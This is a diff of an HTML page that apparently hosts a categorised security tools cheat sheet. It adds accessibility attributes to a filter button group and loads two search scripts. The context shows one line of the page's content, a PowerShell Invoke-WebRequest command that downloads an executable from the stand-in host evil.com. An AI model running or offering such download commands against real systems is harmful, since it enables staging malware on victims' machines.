@@ -39,7 +39,7 @@
     </div>
 
     <!-- Category Filters -->
-    <div class="button-container search-container">
+    <div class="button-container search-container" role="group" aria-label="Filter tools by category">
         <button class="button filter-btn" data-cat="all" aria-pressed="true">All</button>
         <button class="button button-secondary filter-btn" data-cat="net" aria-pressed="false">Networking</button>
         <button class="button button-secondary filter-btn" data-cat="web" aria-pressed="false">Web</button>
@@ -333,6 +333,8 @@ Invoke-WebRequest -Uri "http://evil.com/file.exe" -OutFile "C:\Temp\file.exe"
 
   <script src="js/ui.js" defer></script>
   <script src="js/highlight.js"></script>
+  <script src="js/search-data.js"></script>
+  <script src="js/search.js"></script>
   <script src="js/tools-filter.js"></script>
 </body>
 </html>
